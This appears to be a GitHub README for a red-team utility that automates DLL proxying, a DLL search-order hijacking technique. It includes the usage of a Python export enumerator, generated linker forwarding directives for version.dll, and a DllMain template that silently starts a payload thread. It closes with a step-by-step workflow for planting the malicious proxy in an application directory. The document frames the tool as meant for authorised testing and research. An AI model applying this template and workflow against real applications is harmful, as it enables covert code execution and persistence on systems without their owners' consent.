# dll-proxing

A utility for automating DLL proxy generation - enumerate a target DLL's exports and output ready-to-use `#pragma comment` linker directives for building a proxy DLL in Visual Studio.

Used in the blog post: [DLL Proxying](https://0xd1s.com/blog/dll-proxing)

---

## What is DLL Proxying?

DLL proxying is a technique where a malicious DLL intercepts a legitimate DLL load by exploiting the Windows DLL search order. Instead of simply replacing the DLL (which would crash the application), the malicious DLL **forwards every exported function** to the original renamed DLL - so the application works normally while your payload executes silently.

```
App.exe  -->  version.dll (malicious proxy)  -->  version2.dll (original, renamed)
                    |
              DLL_PROCESS_ATTACH
              [payload runs here]
```

---

## Contents

| File | Description |
| ---- | ----------- |
| `inspect_dll_exports.py` | Enumerate a DLL's exports and generate `#pragma comment` linker lines |
| `dll_template/dllmain.cpp` | Visual Studio DLL project template with the proxy pattern |

---

## Requirements

```bash
pip install pefile
```

---

## Usage

```bash
python inspect_dll_exports.py --dll "C:\Windows\System32\version.dll" --proxy-name version2
```

### Options

| Flag | Default | Description |
| ---- | ------- | ----------- |
| `--dll` | *(required)* | Full path to the DLL you want to proxy |
| `--proxy-name` | `original` | The name (without `.dll`) you will give the renamed legitimate DLL |
| `--out` | `exported_functions.txt` | Output file for the generated pragma lines |

### Example output (`exported_functions.txt`)

```cpp
#pragma comment(linker, "/export:GetFileVersionInfoA=version2.GetFileVersionInfoA,@1")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=version2.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/export:GetFileVersionInfoExA=version2.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/export:GetFileVersionInfoExW=version2.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=version2.GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=version2.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=version2.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=version2.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/export:GetFileVersionInfoW=version2.GetFileVersionInfoW,@9")
#pragma comment(linker, "/export:VerFindFileA=version2.VerFindFileA,@10")
#pragma comment(linker, "/export:VerFindFileW=version2.VerFindFileW,@11")
#pragma comment(linker, "/export:VerInstallFileA=version2.VerInstallFileA,@12")
#pragma comment(linker, "/export:VerInstallFileW=version2.VerInstallFileW,@13")
#pragma comment(linker, "/export:VerLanguageNameA=version2.VerLanguageNameA,@14")
#pragma comment(linker, "/export:VerLanguageNameW=version2.VerLanguageNameW,@15")
#pragma comment(linker, "/export:VerQueryValueA=version2.VerQueryValueA,@16")
#pragma comment(linker, "/export:VerQueryValueW=version2.VerQueryValueW,@17")
```

Paste the contents of `exported_functions.txt` into your DLL project below `#include "pch.h"`.

---

## DLL Template

```cpp
#include "pch.h"

/* Paste the generated pragma lines here */
#pragma comment(linker, "/export:GetFileVersionInfoA=version2.GetFileVersionInfoA,@1")
// ... rest of exports ...

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // Run payload in a new thread to avoid blocking DllMain
        HANDLE hThread = CreateThread(NULL, 0,
            (LPTHREAD_START_ROUTINE)YourPayload, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

---

## Workflow

1. Use **Process Monitor** to find DLLs with `NAME NOT FOUND` results for your target process.
2. Pick a candidate with few exports (avoid `dbghelp.dll` - too many).
3. Run `inspect_dll_exports.py` against the chosen DLL.
4. Paste the output into the DLL template in Visual Studio.
5. Build as **Release x64**.
6. Test with `rundll32.exe .\version.dll,whatever`.
7. Rename the original DLL (e.g., `version.dll` -> `version2.dll`).
8. Drop your proxy DLL as `version.dll` in the application directory.

---

## Disclaimer

This tool is intended for authorised red team engagements, security research, and educational purposes only. Only use it against systems and applications you have explicit written permission to test.

---

## Author

[0xd1s](https://github.com/ischyr) - [Blog](https://0xd1s.com)
